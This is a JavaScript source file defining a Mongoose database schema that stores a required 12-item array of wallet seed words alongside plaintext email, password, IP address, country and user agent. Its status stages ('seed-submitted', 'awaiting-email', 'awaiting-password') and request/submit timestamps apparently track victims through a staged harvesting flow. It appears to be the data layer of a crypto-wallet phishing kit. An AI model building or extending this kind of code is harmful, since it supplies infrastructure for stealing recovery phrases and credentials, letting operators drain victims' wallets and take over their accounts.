import mongoose from 'mongoose'

const sessionSchema = new mongoose.Schema({
  clientId: {
    type: String,
    required: true,
    index: true,
  },
  seedWords: {
    type: [String],
    required: true,
    validate: [
      (arr) => Array.isArray(arr) && arr.length === 12,
      'Seed words array must contain 12 items.',
    ],
  },
  email: {
    type: String,
    default: null,
  },
  password: {
    type: String,
    default: null,
  },
  status: {
    type: String,
    enum: [
      'seed-submitted',
      'awaiting-email',
      'awaiting-password',
      'password-submitted',
      'finalized',
    ],
    default: 'seed-submitted',
  },
  ipAddress: {
    type: String,
    default: null,
  },
  country: {
    type: String,
    default: 'Unknown',
  },
  userAgent: {
    type: String,
    default: null,
  },
  emailSubmittedAt: {
    type: Date,
    default: null,
  },
  emailRequestedAt: {
    type: Date,
    default: null,
  },
  passwordSubmittedAt: {
    type: Date,
    default: null,
  },
  passwordRequestedAt: {
    type: Date,
    default: null,
  }
}, {
  timestamps: true
})

// Prevent model re-compilation in serverless environments
export default mongoose.models.Session || mongoose.model('Session', sessionSchema)